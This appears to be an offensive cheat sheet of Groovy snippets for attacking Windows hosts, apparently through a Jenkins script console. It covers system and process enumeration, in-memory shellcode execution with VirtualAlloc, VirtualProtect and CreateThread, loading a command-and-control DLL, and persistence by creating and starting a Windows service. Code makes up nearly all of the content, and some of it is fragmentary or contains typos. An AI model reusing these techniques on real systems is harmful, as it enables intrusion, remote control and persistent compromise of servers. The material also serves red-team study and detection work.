# Windows

## Enumeration

### List Files

```groovy
println "Command processor"
def sout = new StringBuild(), serr = new StringBuilder();
def args = ["cmd", "/c", "dir C:\\path\\to\\directory\\"];
def proc = new ProcessBuilder(args);
Process process = proc.start();
process.consumeProcessOutput(sout, serr);
process.waitForOrKill(2000);
println sout;
```

### Processes

#### List Processes

```groovy
import com.sun.jna.Native
import com.sun.jna.Pointer
import com.sun.jna.ptr.IntByReference
import com.sun.jna.Library

interface Psapi extends Library {
    Psapi INSTANCE = Native.load("Psapi", Psapi.class)
    boolean EnumProcesses(int[] lpidProcess, int cb, IntByReference lpcbNeeded)
    int GetModuleFileNameExW(Pointer hProcess, Pointer hModule, char[] lpFilename, int nSize)
}

List<Integer> getProcessIds() {
    final int PROCESS_ID_ARRAY_SIZE = 1024
    int[] processIds = new int[PROCESS_ID_ARRAY_SIZE]
    IntByReference pcbNeeded = new IntByReference()

    boolean success = Psapi.INSTANCE.EnumProcesses(processIds, processIds.size() * Integer.BYTES, pcbNeeded)

    if (!success) {
        throw new RuntimeException("Failed to enumerate processes")
    }

    int count = pcbNeeded.getValue() / Integer.BYTES
    return processIds[0..<count].toList()
}
```

### Current Process

```groovy
import com.sun.jna.Native
import com.sun.jna.Pointer
import com.sun.jna.ptr.IntByReference
import com.sun.jna.Library

String getProcessName(int pid) {
    Pointer hProcess = Kernel32.INSTANCE.OpenProcess(0x0400 | 0x0010, false, pid)
    if (hProcess == null) {
        return "Unknown"
    }
    try {
        char[] filename = new char[1024]
        int length = Psapi.INSTANCE.GetModuleFileNameExW(hProcess, null, filename, filename.size())
        String processName = length > 0 ? new String(filename, 0, length) : "Unknown"
        return processName
    } finally {
        Kernel32.INSTANCE.CloseHandle(hProcess)
    }
}
```

### Operating System

```groovy
println "systeminfo".execute().text;
```

## Payload Execution

### Memory Allocation

```groovy
import com.sun.jna.Native
import com.sun.jna.Pointer
import com.sun.jna.ptr.IntByReference
import com.sun.jna.Library

Pointer lpAddress = Kernel32.INSTANCE.VirtualAlloc(
      null,
      fileBytes.length,
      Constants.MEM_COMMIT | Constants.MEM_RESERVE,
      Constants.PAGE_READWRITE
  )

  if (lpAddress == null) {
      throw new RuntimeException("Failed to allocate memory. Error: " + Kernel32.INSTANCE.GetLastError())
  }

  lpAddress.write(0, fileBytes, 0, fileBytes.length)

  IntByReference lpflOldProtect = new IntByReference()

  if (!Kernel32.INSTANCE.VirtualProtect(lpAddress, fileBytes.length, Constants.PAGE_EXECUTE_READ, lpflOldProtect)) {
      throw new RuntimeException("Failed to change memory protection. Error: " + Kernel32.INSTANCE.GetLastError())
  }

  IntByReference lpThreadId = new IntByReference()

  Pointer hThread = Kernel32.INSTANCE.CreateThread(
      null,
      0,
      lpAddress,
      null,
      0,
      lpThreadId
  )

  if (hThread == null) {
      throw new RuntimeException("Failed to create thread. Error: " + Kernel32.INSTANCE.GetLastError())
  }

  if (Kernel32.INSTANCE.WaitForSingleObject(hThread, (int)0xFFFFFFFF) == 0xFFFFFFFF) {
	throw new RuntimeException("Failed to wait for thread. Error: " + Kernel32.INSTANCE.GetLastError())
  }
}

// Finish the thread to prevent Jenkins locking it up
Thread thread = new Thread(){
    public void run(){
        Go();
    }
}

thread.start();
```

### Load Library

```groovy
@Grab(group='net.java.dev.jna', module='jna', version='5.12.1')
import com.sun.jna.Native
import com.sun.jna.Library
import com.sun.jna.Pointer


interface CustomLibrary extends Library {
    CustomLibrary INSTANCE = Native.load("C:\\Users\\Administrator\\Downloads\\c2.x64.dll", CustomLibrary.class)
    
    int entrypoint ()
}

try {
    int result = CustomLibrary.INSTANCE.entrypoint()
    println "CustomFunction result: $result"
} catch (Exception e) {
    println "Error: ${e.message}"
}
```

## Persistence

### Maintaining Access

```groovy
Pointer createService(Pointer hSCManager, String serviceName, String displayName, String binaryPath) {
    Pointer hService = Advapi32.INSTANCE.CreateServiceA(
        hSCManager,
        serviceName,
        displayName,
        (int) Constants.SERVICE_ALL_ACCESS,
        Constants.SERVICE_WIN32_OWN_PROCESS,
        Constants.SERVICE_DEMAND_START,
        Constants.SERVICE_ERROR_NORMAL,
        binaryPath,
        null,
        null,
        null,
        null,
        null
    )

    if (hService == null) {
        throw new RuntimeException("Failed to create service. Error: " + Kernel32.INSTANCE.GetLastError())
    }
    return hService
}

boolean startService(Pointer hService) {
    if (!Advapi32.INSTANCE.StartServiceW(hService, 0, null)) {
        throw new RuntimeException("Failed to start service. Error: " + Kernel32.INSTANCE.GetLastError())
    }
    return true
}
```

---
## References

### Internal All The Things

- [InternalAllTheThings: Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet)

### TrustedSec

- [TrustedSec: Offensively Groovy](https://trustedsec.com/blog/offensively-groovy)